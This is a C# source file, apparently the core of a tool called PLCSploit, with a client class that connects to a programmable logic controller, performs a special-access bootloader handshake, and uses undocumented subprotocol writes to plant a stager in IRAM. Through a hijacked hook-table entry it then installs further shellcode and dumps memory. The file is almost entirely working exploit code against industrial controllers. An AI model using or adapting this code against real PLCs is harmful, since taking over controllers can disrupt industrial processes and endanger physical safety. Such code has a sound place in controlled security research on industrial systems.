using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace PLCSploit.Core
{
    public class PLCClient : IDisposable
    {
        private TcpClient _client;
        private NetworkStream _stream;
        private readonly Action<string, LogCategory> _logger;

        private const int MAX_MSG_LEN = 190;
        private const uint ADD_HOOK_TABLE_START = 0x1003ABA0;
        private const int DEFAULT_STAGER_ADDHOOK_IND = 0x20;
        private const int DEFAULT_SECOND_ADD_HOOK_IND = 0x1a;
        private const uint IRAM_STAGER_START = 0x10030100;
        public uint next_payload_location = 0x10010100;

        public bool IsConnected => _client?.Connected ?? false;

        public PLCClient(Action<string, LogCategory> logger = null)
        {
            // Default logger delegates to Log.Add (info category if not provided)
            _logger = logger ?? ((msg, cat) => Log.Add(msg, cat));
        }

        private static string BytesToEscapedAscii(byte[] data)
        {
            var sb = new StringBuilder(data.Length * 2);
            foreach (var b in data)
            {
                if (b >= 0x20 && b <= 0x7E)
                {
                    sb.Append((char)b);
                }
                else
                {
                    sb.Append("\\x").Append(b.ToString("X2"));
                }
            }
            return sb.ToString();
        }

        private static bool ContainsPattern(byte[] haystack, byte[] needle)
        {
            if (needle == null || haystack == null || needle.Length == 0 || haystack.Length < needle.Length)
                return false;
            for (int i = 0; i <= haystack.Length - needle.Length; i++)
            {
                bool match = true;
                for (int j = 0; j < needle.Length; j++)
                {
                    if (haystack[i + j] != needle[j]) { match = false; break; }
                }
                if (match) return true;
            }
            return false;
        }

        public void Connect(string host, int port)
        {
            if (IsConnected) return;
            _logger($"Connecting to PLC at {host}:{port}...", LogCategory.Communication);
            _client = new TcpClient(host, port);
            _stream = _client.GetStream();
            _client.ReceiveTimeout = 500;
            _logger("PLC client connected.", LogCategory.Communication);
        }

        public bool Handshake()
        {
            if (!IsConnected) throw new InvalidOperationException("Client is not connected.");

            _logger("Attempting handshake...", LogCategory.Communication);
            string magic = "MFGT1";
            string pad = "AAAA";
            byte[] handshake = Encoding.ASCII.GetBytes(pad + magic);

            for (int i = 0; i < 100; i++)
            {
                Send(handshake);

                var responseBuffer = new List<byte>();
                var startTime = DateTime.Now;
                var totalTimeout = TimeSpan.FromMilliseconds(300);

                while ((DateTime.Now - startTime) < totalTimeout)
                {
                    var answ = Receive(timeout: 50);
                    if (answ.Length > 0)
                    {
                        responseBuffer.AddRange(answ);
                        if (responseBuffer.Count >= 4)
                        {
                            var respBytes = responseBuffer.ToArray();
                            var printable = BytesToEscapedAscii(respBytes);
                            _logger($"Received handshake response: {BitConverter.ToString(respBytes).Replace("-", "")} (ASCII: {printable})", LogCategory.Info);

                            if (ContainsPattern(respBytes, new byte[] { (byte)'-', (byte)'C', (byte)'P', (byte)'U' }))
                            {
                                _logger($"SUCCESS: Got special access greeting: ASCII: {printable}", LogCategory.Info);
                                return true;
                            }
                        }
                    }
                    else
                    {
                        if (responseBuffer.Count > 0)
                        {
                            var respBytes = responseBuffer.ToArray();
                            var printable = BytesToEscapedAscii(respBytes);
                            _logger($"Final handshake response: {BitConverter.ToString(respBytes).Replace("-", "")} (ASCII: {printable})", LogCategory.Info);

                            if (ContainsPattern(respBytes, new byte[] { (byte)'-', (byte)'C', (byte)'P', (byte)'U' }))
                            {
                                _logger($"SUCCESS: Got special access greeting: ASCII: {printable}", LogCategory.Info);
                                return true;
                            }
                        }
                        break; 
                    }
                }
                Thread.Sleep(10);
            }
            _logger("ERROR: Handshake failed.", LogCategory.Error);
            return false;
        }

        public void Send(byte[] data)
        {
            if (!IsConnected) return;
            _stream.Write(data, 0, data.Length);
        }

        public byte[] Receive(int size = 256, int timeout = 300)
        {
            if (!IsConnected) return new byte[0];
            _client.ReceiveTimeout = timeout;
            var buffer = new byte[size];
            try
            {
                var bytesRead = _stream.Read(buffer, 0, buffer.Length);
                var data = new byte[bytesRead];
                Array.Copy(buffer, data, bytesRead);
                return data;
            }
            catch (IOException)
            {
                return new byte[0];
            }
        }

        public byte CalculateChecksum(IEnumerable<byte> data)
        {
            int sum = 0;
            foreach (var b in data)
            {
                sum += b;
            }
            var negativeSum = -sum;
            var bytes = BitConverter.GetBytes(negativeSum);
            if (!BitConverter.IsLittleEndian)
            {
                Array.Reverse(bytes);
            }
            return bytes[0];
        }

        public void SendPacket(byte[] msg, int step = 2, int sleepAmt = 10)
        {
            if (msg.Length > MAX_MSG_LEN)
                throw new ArgumentException("Message too long");
            Thread.Sleep(10);
            var packet = new byte[msg.Length + 2];
            packet[0] = (byte)(msg.Length + 1);
            Array.Copy(msg, 0, packet, 1, msg.Length);
            packet[packet.Length - 1] = CalculateChecksum(packet.Take(packet.Length - 1));
            _logger($"Sending packet: {BitConverter.ToString(packet).Replace("-", "")}", LogCategory.Info);
            for (int i = 0; i < packet.Length; i += step)
            {
                Thread.Sleep(sleepAmt);
                var chunk = packet.Skip(i).Take(step).ToArray();
                Send(chunk);
            }
        }

        public byte[] RecvPacket()
        {
            var lenByte = Receive(1);
            if (lenByte == null || lenByte.Length == 0) return null;

            var len = lenByte[0];
            _logger($"RecvPacket: Expected packet length (excluding checksum): {len} bytes", LogCategory.Info);
            if (len == 0) return new byte[0];
            var remaining = (int)len;
            var answ = new byte[len + 1];
            answ[0] = lenByte[0];
            var offset = 1;
            while (remaining > 0)
            {
                var add = Receive(remaining, 100);
                if (add == null || add.Length == 0) 
                {
                    _logger($"RecvPacket: Timeout waiting for {remaining} more bytes. Got so far: {BitConverter.ToString(answ.Take(offset).ToArray()).Replace("-", "")}", LogCategory.Info);
                    return null;
                }
                _logger($"RecvPacket: Received {add.Length} bytes: {BitConverter.ToString(add).Replace("-", "")}", LogCategory.Info);
                Array.Copy(add, 0, answ, offset, add.Length);
                offset += add.Length;
                remaining -= add.Length;
                _logger($"RecvPacket: Still need {remaining} more bytes", LogCategory.Info);
            }
            _logger($"RecvPacket: Complete packet (including checksum) received: {BitConverter.ToString(answ).Replace("-", "")} (ASCII: {BytesToEscapedAscii(answ)})", LogCategory.Info);
            var receivedChecksum = answ.Last();
            var lengthByte = answ[0];
            var bytesToChecksum = answ.Take(lengthByte).ToArray();
            var calculatedChecksum = CalculateChecksum(bytesToChecksum);
            _logger($"RecvPacket: Received checksum: {receivedChecksum:X2}, Calculated checksum: {calculatedChecksum:X2}", LogCategory.Info);
            _logger($"RecvPacket: Checksum calculated on {lengthByte} bytes: {BitConverter.ToString(bytesToChecksum).Replace("-", "")}", LogCategory.Info);
            if (calculatedChecksum != receivedChecksum)
            {
                _logger($"ERROR: Checksum validity failed. Got: {BitConverter.ToString(answ).Replace("-", "")}", LogCategory.Info);
                _logger($"RecvPacket: Packet breakdown - Length: {answ[0]:X2}, Data+Len: {BitConverter.ToString(bytesToChecksum).Replace("-", "")}, Checksum: {receivedChecksum:X2}", LogCategory.Info);
                return null;
            }
            var payload = answ.Skip(1).Take(lengthByte - 1).ToArray();
            _logger($"RecvPacket: Extracted payload: {BitConverter.ToString(payload).Replace("-", "")}", LogCategory.Info);
            return payload;
        }

        public byte[] RecvMany()
        {
            var answ = new List<byte>();
            while (true)
            {
                var next_chunk = RecvPacket();
                if (next_chunk == null || next_chunk.Length == 0) break;
                answ.AddRange(next_chunk);
            }
            return answ.ToArray();
        }

        public byte[] GetVersionRaw()
        {
            SendPacket(new byte[] { 0 });
            var answ = RecvPacket();
            if (answ == null)
            {
                _logger("ERROR: Failed to receive version response", LogCategory.Info);
                return null;
            }
            var hex = BitConverter.ToString(answ).Replace("-", "");
            var asciiEsc = BytesToEscapedAscii(answ);
            _logger($"Got PLC bootLoader version: HEX={hex} ASCII={asciiEsc}", LogCategory.Info);
            return answ;
        }

        public string GetVersion()
        {
            var bytes = GetVersionRaw();
            if (bytes == null) return null;
            if (bytes.Length < 5)
            {
                return Encoding.ASCII.GetString(bytes);
            }
            char prefix = (char)bytes[2];
            int count = bytes.Length - 5;
            if (count < 0) count = 0;
            var numbers = bytes.Skip(3).Take(count).Select(b => b.ToString());
            var version = prefix + string.Join(".", numbers);
            _logger($"Got PLC bootLoader version (formatted): {version}", LogCategory.Info);
            return version;
        }

        public byte[] InvokePrimaryHandler(byte handlerInd, byte[] args, bool awaitResponse = true)
        {
            var payload = new byte[1 + args.Length];
            payload[0] = handlerInd;
            Array.Copy(args, 0, payload, 1, args.Length);
            SendPacket(payload);
            if (awaitResponse) return RecvPacket();
            return null;
        }

        public byte[] InvokeAddHook(int addHookNo, byte[] args, bool awaitResponse = true)
        {
            var hookInd = 0x1c;
            var newArgs = new byte[1 + args.Length];
            newArgs[0] = (byte)addHookNo;
            Array.Copy(args, 0, newArgs, 1, args.Length);
            return InvokePrimaryHandler((byte)hookInd, newArgs, awaitResponse);
        }

        public byte[] EnterSubprotocolHandler(int mode)
        {
            ushort[] magics = { 0, 0x3BC2, 0x9d26, 0xe17a, 0xc54f };
            var magic = BitConverter.GetBytes(magics[mode]);
            Array.Reverse(magic);
            return InvokePrimaryHandler(0x80, magic);
        }

        public void LeaveSubprotocolHandler()
        {
            SendPacket(new byte[] { 0x81, 0xD0, 0x67 });
            RecvPacket();
        }

        private void RawSubprotocolWrite(uint arg_dw, byte[] add_args)
        {
            var packet = new byte[7 + add_args.Length];
            packet[0] = 0x84;
            packet[1] = 0x5a;
            packet[2] = 0x2e;
            var arg_dw_bytes = BitConverter.GetBytes(arg_dw);
            Array.Reverse(arg_dw_bytes);
            Array.Copy(arg_dw_bytes, 0, packet, 3, 4);
            Array.Copy(add_args, 0, packet, 7, add_args.Length);
            SendPacket(packet);
            RecvPacket();
        }

        private void ExploitWriteChunkToIRAM(uint tar, byte[] contents)
        {
            var target_argument = tar - 0x10000000;
            var mask = new byte[contents.Length];
            for (int i = 0; i < mask.Length; i++) mask[i] = 0xff;
            RawSubprotocolWrite(target_argument, mask);
            RawSubprotocolWrite(target_argument, contents);
        }

        public void ExploitWriteToIRAM(uint tar, byte[] contents)
        {
            EnterSubprotocolHandler(1);
            int chunk_size = 16;
            for (int i = 0; i < contents.Length; i += chunk_size)
            {
                _logger($"Writing to IRAM {i:X4}/{contents.Length:X4}", LogCategory.Info);
                var chunk = contents.Skip(i).Take(chunk_size).ToArray();
                ExploitWriteChunkToIRAM(tar + (uint)i, chunk);
            }
            LeaveSubprotocolHandler();
        }

        public void InstallStager(byte[] shellcode)
        {
            _logger("Installing stager...", LogCategory.Info);
            ExploitWriteToIRAM(IRAM_STAGER_START, shellcode);
            var ptr = BitConverter.GetBytes(IRAM_STAGER_START);
            Array.Reverse(ptr);
            var data = new byte[] { 0x00, 0xff }.Concat(ptr).ToArray();
            ExploitWriteToIRAM(ADD_HOOK_TABLE_START + 8 * DEFAULT_STAGER_ADDHOOK_IND + 2, data);
            _logger("Stager installed.", LogCategory.Info);
        }

        private byte[] EncodePacketForStager(byte[] chunk)
        {
            for (int i = 1; i < 256; i++)
            {
                bool collision = chunk.Contains((byte)i);
                if (i == chunk.Length + 2) collision = true;
                if (collision) continue;
                var encoded = new byte[chunk.Length + 1];
                encoded[0] = (byte)i;
                for (int j = 0; j < chunk.Length; j++)
                    encoded[j + 1] = (byte)(chunk[j] ^ i);
                return encoded;
            }
            return null;
        }

        public void SendFullMsgViaStager(byte[] msg)
        {
            for (int i = 0; i < msg.Length; i += MAX_MSG_LEN - 1)
            {
                var chunk = msg.Skip(i).Take(MAX_MSG_LEN - 1).ToArray();
                SendPacket(EncodePacketForStager(chunk));
                RecvPacket();
            }
            SendPacket(EncodePacketForStager(new byte[0]));
            RecvPacket();
        }

        public void WriteViaStager(uint tar_addr, byte[] contents)
        {
            var addr_bytes = BitConverter.GetBytes(tar_addr);
            Array.Reverse(addr_bytes);
            InvokeAddHook(DEFAULT_STAGER_ADDHOOK_IND, addr_bytes, false);
            SendFullMsgViaStager(contents);
        }

        public int InstallAddHookViaStager(uint tar_addr, byte[] shellcode)
        {
            _logger($"Installing payload at 0x{tar_addr:X8} via stager...", LogCategory.Info);
            var ptr = BitConverter.GetBytes(tar_addr);
            Array.Reverse(ptr);
            var data = new byte[] { 0x00, 0x00, 0x00, 0xff }.Concat(ptr).ToArray();
            WriteViaStager(ADD_HOOK_TABLE_START + 8 * DEFAULT_SECOND_ADD_HOOK_IND, data);
            WriteViaStager(tar_addr, shellcode);

            if (tar_addr == next_payload_location)
            {
                next_payload_location += (uint)shellcode.Length;
                while (next_payload_location % 4 != 0)
                {
                    next_payload_location++;
                }
            }
            _logger("Payload installed.", LogCategory.Info);
            return DEFAULT_SECOND_ADD_HOOK_IND;
        }

        public byte[] PayloadDumpMem(uint tar_addr, uint num_bytes, int addhook_ind)
        {
            var addr_bytes = BitConverter.GetBytes(tar_addr);
            Array.Reverse(addr_bytes);
            var num_bytes_arr = BitConverter.GetBytes(num_bytes);
            Array.Reverse(num_bytes_arr);

            var args = new List<byte>();
            args.Add((byte)'A');
            args.AddRange(addr_bytes);
            args.AddRange(num_bytes_arr);
            var answ = InvokeAddHook(addhook_ind, args.ToArray());
            if (Encoding.ASCII.GetString(answ) != "Ok")
            {
                throw new Exception("Dump command failed");
            }
            return RecvMany();
        }

        public void Bye()
        {
            _logger("Sending bye command to PLC...", LogCategory.Info);
            var response = InvokePrimaryHandler(0xa2, new byte[0]);
            if (response != null && response.Length == 2 && response[0] == 0xa2 && response[1] == 0x00)
            {
                _logger("Bye command successful - PLC will resume normal operation", LogCategory.Info);
            }
            else
            {
                _logger("WARNING: Bye command response was unexpected", LogCategory.Info);
            }
        }

        public void Disconnect()
        {
            _logger("Disconnecting from PLC...", LogCategory.Info);
            _stream?.Close();
            _client?.Close();
            _logger("PLC client disconnected.", LogCategory.Info);
        }

        public void Dispose()
        {
            Disconnect();
        }
    }
}